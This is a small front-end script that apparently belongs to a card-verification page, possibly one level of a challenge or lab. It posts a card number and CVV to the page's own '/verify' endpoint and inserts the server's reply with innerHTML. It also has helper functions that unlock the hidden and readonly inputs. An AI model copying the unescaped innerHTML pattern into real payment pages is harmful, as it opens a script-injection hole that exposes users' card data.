document.getElementById("verifyBtn").addEventListener("click", async () => {
  const cardNo = document.getElementById("cardNo").value.trim();
  const cvv = document.getElementById("cvv").value.trim();

  const res = await fetch("/verify", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cardNo, cvv })
  });

  const data = await res.json();

  const box = document.getElementById("result");
  box.style.display = "block";
  box.innerHTML = data.msg;
  box.className = data.ok ? "success" : "error";

  if (data.ok && data.redirect) {
    setTimeout(() => {
      window.location.href = data.redirect;
    }, 1000);
  }
});

function l2_enableInput() {
  document.getElementById("cardNo").removeAttribute("readonly");
  document.getElementById("cvv").removeAttribute("hidden");
  document.getElementById("cardNo").focus();
}

function l2_verifyCard() {
  document.getElementById("verifyBtn").click();
}
